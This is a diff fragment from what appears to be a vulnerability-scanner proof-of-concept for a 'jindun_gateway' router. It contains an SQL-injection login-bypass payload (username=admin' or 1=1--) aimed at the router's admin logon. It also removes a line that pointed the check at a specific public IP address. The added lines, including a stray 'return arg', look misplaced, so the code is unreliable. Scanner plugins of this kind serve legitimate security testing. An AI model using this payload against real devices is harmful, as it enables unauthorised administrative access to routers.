@@ -30,6 +30,7 @@ Fun=msaAdminLogon&username=admin' or 1=1--&password=admin'''
     if 'errtype:0,' in res and 'sessionid:' in res:
         security_hole("Router vulnerable!:"+poc)
 
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('jindun_gateway', 'https://218.29.8.41/')[1])
